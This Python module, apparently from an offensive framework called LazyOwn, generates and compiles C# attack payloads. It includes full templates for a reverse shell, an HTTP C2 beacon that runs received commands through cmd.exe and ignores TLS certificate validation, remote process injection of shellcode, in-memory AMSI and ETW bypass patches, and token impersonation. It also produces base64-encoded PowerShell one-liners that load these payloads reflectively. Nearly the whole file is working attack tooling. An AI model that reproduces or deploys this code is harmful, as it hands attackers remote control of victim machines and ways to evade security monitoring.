""".NET/C# payload generation — execute-assembly, inline-assembly, Roslyn compilation.

Provides DotNetPayloadFactory for generating C# payloads including reverse shells,
process injection shells, token manipulation tools, and AMSI/ETW bypass assemblies.
Supports both execute-assembly (compile to DLL/EXE via csc/dotnet) and inline-assembly
(embed C# source for reflective loading) delivery patterns.

All templates derive target connection parameters from payload.json configuration.
"""

from __future__ import annotations

import base64
import os
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

from modules.payload_factory import OUTPUT_FORMATS

SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"

CSHARP_TEMPLATES: dict[str, str] = {
    "reverse_tcp": r"""
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

public class LazyStager {{
    public static void Main() {{
        using (var client = new TcpClient("{lhost}", {lport})) {{
            using (var stream = client.GetStream()) {{
                var proc = new Process {{
                    StartInfo = new ProcessStartInfo {{
                        FileName = "{shell}",
                        Arguments = "{shell_args}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardInput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    }}
                }};
                proc.Start();
                var readThread = new System.Threading.Thread(() => {{
                    var buf = new byte[4096];
                    int read;
                    while ((read = stream.Read(buf, 0, buf.Length)) > 0) {{
                        proc.StandardInput.BaseStream.Write(buf, 0, read);
                        proc.StandardInput.BaseStream.Flush();
                    }}
                }});
                readThread.Start();
                var writeThread = new System.Threading.Thread(() => {{
                    var buf = new byte[4096];
                    int read;
                    while ((read = proc.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0) {{
                        stream.Write(buf, 0, read);
                        stream.Flush();
                    }}
                }});
                writeThread.Start();
                readThread.Join();
                writeThread.Join();
                proc.WaitForExit();
            }}
        }}
    }}
}}
""",

    "http_beacon": r"""
using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.IO;

public class LazyBeacon {{
    private static readonly string C2_URL = "{c2_url}";
    private static readonly int SLEEP_SECONDS = {sleep};
    private static readonly string CLIENT_ID = "{client_id}";
    private static readonly Dictionary<string, string> ExtraHeaders = new Dictionary<string, string> {{
        {{ "{extra_header_name}", "{extra_header_value}" }},
        {{ "X-Session-Id", CLIENT_ID }}
    }};

    public static void Main() {{
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;
        ServicePointManager.Expect100Continue = false;

        while (true) {{
            try {{
                var cmd = GetCommand();
                if (!string.IsNullOrEmpty(cmd)) {{
                    var result = ExecuteCommand(cmd);
                    PostResult(result);
                }}
            }} catch {{ }}
            Thread.Sleep(SLEEP_SECONDS * 1000 + new Random().Next(0, 2000));
        }}
    }}

    private static string GetCommand() {{
        var req = (HttpWebRequest)WebRequest.Create(C2_URL + "/command/" + CLIENT_ID);
        req.Method = "GET";
        req.UserAgent = "{user_agent}";
        foreach (var h in ExtraHeaders) req.Headers.Add(h.Key, h.Value);
        using (var resp = (HttpWebResponse)req.GetResponse())
        using (var reader = new StreamReader(resp.GetResponseStream()))
            return reader.ReadToEnd();
    }}

    private static string ExecuteCommand(string cmd) {{
        try {{
            var proc = new Process {{
                StartInfo = new ProcessStartInfo {{
                    FileName = "cmd.exe",
                    Arguments = "/c " + cmd,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                }}
            }};
            proc.Start();
            var output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
            proc.WaitForExit(15000);
            return output;
        }} catch (Exception ex) {{
            return "Error: " + ex.Message;
        }}
    }}

    private static void PostResult(string result) {{
        var req = (HttpWebRequest)WebRequest.Create(C2_URL + "/command/" + CLIENT_ID);
        req.Method = "POST";
        req.ContentType = "text/plain";
        req.UserAgent = "{user_agent}";
        foreach (var h in ExtraHeaders) req.Headers.Add(h.Key, h.Value);
        var data = Encoding.UTF8.GetBytes(result);
        req.ContentLength = data.Length;
        using (var stream = req.GetRequestStream()) stream.Write(data, 0, data.Length);
        using (var resp = (HttpWebResponse)req.GetResponse()) {{ }}
    }}
}}
""",

    "process_injection": r"""
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class LazyInject {{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    public static void Main(string[] args) {{
        var targetPid = int.Parse(args[0]);
        var shellcode = Convert.FromBase64String("{shellcode_b64}");
        var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
        var ptr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        UIntPtr written;
        WriteProcessMemory(hProcess, ptr, shellcode, (uint)shellcode.Length, out written);
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
    }}
}}
""",

    "amsi_bypass": r"""
using System;
using System.Runtime.InteropServices;

public class LazyAmsiBypass {{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Main() {{
        var lib = LoadLibrary("amsi.dll");
        var addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect);

        var patch = new byte[] {{ 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }};
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)6, oldProtect, out _);
    }}
}}
""",

    "etw_bypass": r"""
using System;
using System.Runtime.InteropServices;

public class LazyEtwBypass {{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    public static void PatchEtw() {{
        var ntdll = LoadLibrary("ntdll.dll");
        var addr = GetProcAddress(ntdll, "EtwEventWrite");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)1, 0x40, out oldProtect);
        Marshal.WriteByte(addr, 0xC3);
        VirtualProtect(addr, (UIntPtr)1, oldProtect, out _);
    }}

    public static void Main() {{
        PatchEtw();
    }}
}}
""",

    "token_impersonation": r"""
using System;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.ComponentModel;

public class LazyToken {{
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_IMPERSONATE = 0x0004;
    const uint TOKEN_QUERY = 0x0008;
    const int SecurityImpersonation = 2;
    const int TokenPrimary = 1;

    public static void Main(string[] args) {{
        if (args.Length < 1) {{ Console.WriteLine("Usage: LazyToken.exe <pid>"); return; }}
        var pid = int.Parse(args[0]);
        var hProcess = OpenProcess(0x0400, false, pid);
        IntPtr hToken;
        OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, out hToken);
        IntPtr hDupToken;
        DuplicateTokenEx(hToken, TOKEN_IMPERSONATE, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDupToken);
        ImpersonateLoggedOnUser(hDupToken);
        var identity = new WindowsIdentity(hDupToken);
        Console.WriteLine("[+] Impersonating: " + identity.Name);
    }}
}}
""",
}

COMPILE_TARGETS = {
    "exe": {"args": ["-target:exe", "-out:{output}", "-platform:{platform}"], "entry": True},
    "dll": {"args": ["-target:library", "-out:{output}", "-platform:{platform}"], "entry": False},
    "netmodule": {"args": ["-target:module", "-out:{output}", "-platform:{platform}"], "entry": False},
}

DOTNET_FRAMEWORK_VERSIONS = ["v4.0", "v4.5", "v4.6", "v4.8", "net472", "net48"]


@dataclass
class DotNetPayloadConfig:
    """Configuration for a .NET payload compilation.

    Attributes:
        template_name: Key in CSHARP_TEMPLATES.
        target: Compilation target (exe, dll, netmodule).
        platform: CPU architecture (x86, x64, AnyCPU).
        framework: .NET framework version or '' for modern dotnet.
        lhost: Listener IP for reverse connections.
        lport: Listener port for reverse connections.
        extra_params: Additional template substitution values.
    """

    template_name: str = "reverse_tcp"
    target: str = "exe"
    platform: str = "x64"
    framework: str = ""
    lhost: str = ""
    lport: int = 443
    extra_params: dict[str, str] = field(default_factory=dict)


class DotNetPayloadFactory:
    """Generate, compile, and format .NET/C# payloads.

    Detects available compilers (csc, mcs, dotnet) and selects the best
    toolchain. Falls back to source-only output if no compiler is found.

    Attributes:
        compiler: Detected compiler path or None.
        compiler_type: One of 'csc', 'mcs', 'dotnet', None.
        output_dir: Directory for compiled payloads.
    """

    def __init__(self, output_dir: Optional[Path] = None):
        self.output_dir = Path(output_dir) if output_dir else SESSIONS_DIR / "payloads" / "dotnet"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.compiler, self.compiler_type = self._detect_compiler()

    @staticmethod
    def _detect_compiler() -> tuple[Optional[str], Optional[str]]:
        for name, args in [
            ("csc", ["-version"]),
            ("mcs", ["--version"]),
            ("dotnet", ["--version"]),
        ]:
            try:
                subprocess.run(
                    [name] + args,
                    capture_output=True,
                    timeout=5,
                )
                return name, name
            except (FileNotFoundError, subprocess.TimeoutExpired):
                continue

        csc_paths = [
            r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
            r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
            "/usr/bin/csc",
            "/usr/bin/mcs",
        ]
        for path in csc_paths:
            if os.path.isfile(path):
                for name in ("csc", "mcs"):
                    if name in path:
                        return path, name
                return path, "csc"
        return None, None

    @staticmethod
    def list_templates() -> list[str]:
        """Return available .NET payload template names."""
        return sorted(CSHARP_TEMPLATES.keys())

    def _resolve_template(self, config: DotNetPayloadConfig) -> str:
        template = CSHARP_TEMPLATES.get(config.template_name)
        if not template:
            raise ValueError(f"Unknown template: {config.template_name}")

        params: dict[str, str] = {
            "lhost": config.lhost,
            "lport": str(config.lport),
            "c2_url": f"https://{config.lhost}:{config.lport}",
            "sleep": "10",
            "client_id": "lazybeacon",
            "extra_header_name": "X-LazyOwn",
            "extra_header_value": "v4.0",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "shell": "cmd.exe",
            "shell_args": "",
            "shellcode_b64": config.extra_params.get("shellcode_b64", ""),
        }
        params.update(config.extra_params)
        return template.format(**params)

    def generate_source(self, config: DotNetPayloadConfig) -> str:
        """Generate C# source code from a template.

        Args:
            config: Payload configuration with template and connection params.

        Returns:
            Complete C# source code as a string.

        Raises:
            ValueError: If the template name is unknown.
        """
        return self._resolve_template(config)

    def compile(self, config: DotNetPayloadConfig, source_code: Optional[str] = None) -> Optional[Path]:
        """Compile C# source to an assembly.

        Args:
            config: Compilation target and parameters.
            source_code: Pre-generated source code (generated if None).

        Returns:
            Path to the compiled binary, or None if compilation fails.
        """
        if not self.compiler:
            return None

        source = source_code or self._resolve_template(config)
        with tempfile.NamedTemporaryFile(mode="w", suffix=".cs", delete=False, dir="/tmp") as sfp:
            sfp.write(source)
            tmp_src = sfp.name

        filename = f"lazy_{config.template_name}_{config.platform}"
        ext = {
            "exe": ".exe" if os.name == "nt" else "",
            "dll": ".dll",
            "netmodule": ".netmodule",
        }.get(config.target, ".exe")

        output_path = self.output_dir / f"{filename}{ext}"

        args = [
            self.compiler if self.compiler else "csc",
            f"-out:{output_path}",
            f"-platform:{config.platform}",
            f"-target:{config.target}",
            tmp_src,
        ]

        if config.framework and self.compiler_type in ("csc", "mcs"):
            args.extend([f"-r:System.dll", f"-r:System.Core.dll"])

        try:
            result = subprocess.run(args, capture_output=True, text=True, timeout=30)
            if result.returncode == 0 and output_path.exists():
                return output_path
            return None
        except Exception:
            return None
        finally:
            try:
                os.unlink(tmp_src)
            except OSError:
                pass

    def generate(self, config: DotNetPayloadConfig) -> dict[str, Any]:
        """Generate a .NET payload — source code plus optional binary.

        Args:
            config: Full payload configuration.

        Returns:
            Dict with keys: source, binary_path, binary_b64, format.
        """
        source = self._resolve_template(config)
        binary_path = self.compile(config, source_code=source)

        result: dict[str, Any] = {
            "source": source,
            "format": "cs",
            "binary_path": str(binary_path) if binary_path else None,
            "binary_b64": None,
            "template": config.template_name,
            "target": config.target,
            "platform": config.platform,
        }

        if binary_path and binary_path.exists():
            result["binary_b64"] = base64.b64encode(binary_path.read_bytes()).decode()

        return result

    def generate_powershell_reflective(self, config: DotNetPayloadConfig) -> str:
        """Generate a PowerShell script that reflectively loads a .NET assembly.

        Args:
            config: Payload configuration for the embedded assembly.

        Returns:
            PowerShell script as a string.
        """
        source = self._resolve_template(config)
        source_b64 = base64.b64encode(source.encode()).decode()

        powershell_script = f'''
$SourceCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{source_b64}"))
Add-Type -TypeDefinition $SourceCode -Language CSharp -ReferencedAssemblies @("System.dll", "System.Core.dll") -ErrorAction Stop
[LazyStager]::Main()
'''
        return powershell_script

    def generate_inline_assembly(self, config: DotNetPayloadConfig) -> str:
        """Generate self-decompiling inline .NET assembly load command.

        Decodes base64-encoded C# source, compiles via Add-Type, and executes
        in a single PowerShell command line.

        Args:
            config: Payload configuration.

        Returns:
            Single-line PowerShell command.
        """
        source = self._resolve_template(config)
        source_b64 = base64.b64encode(source.encode()).decode()
        return (
            f'powershell -NoP -C "$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\\"{source_b64}\\"));'
            f'Add-Type -TypeDefinition $s -Language CSharp -Ref @(\\"System.dll\\",\\"System.Core.dll\\");'
            f'[LazyStager]::Main()"'
        )

    def to_format(self, data: dict[str, Any], fmt: str) -> str:
        """Convert a payload result to the requested output format.

        Args:
            data: Result dict from generate().
            fmt: Output format key from OUTPUT_FORMATS.

        Returns:
            Payload in the requested format.
        """
        source = data.get("source", "")

        if fmt in ("py", "python"):
            escaped = source.replace("\\", "\\\\").replace('"', '\\"')
            return f'source_code = """{source}"""\n\n{escaped}'
        if fmt in ("ps1", "powershell"):
            return self.generate_powershell_reflective(
                DotNetPayloadConfig(template_name=data["template"])
            )
        if fmt in ("base64",):
            return base64.b64encode(source.encode()).decode()
        if fmt in ("hex",):
            return source.encode().hex()
        if data.get("binary_b64") and fmt in ("exe", "dll", "raw", "elf"):
            return base64.b64decode(data["binary_b64"]).hex() if fmt == "hex" else data["binary_b64"]
        return source
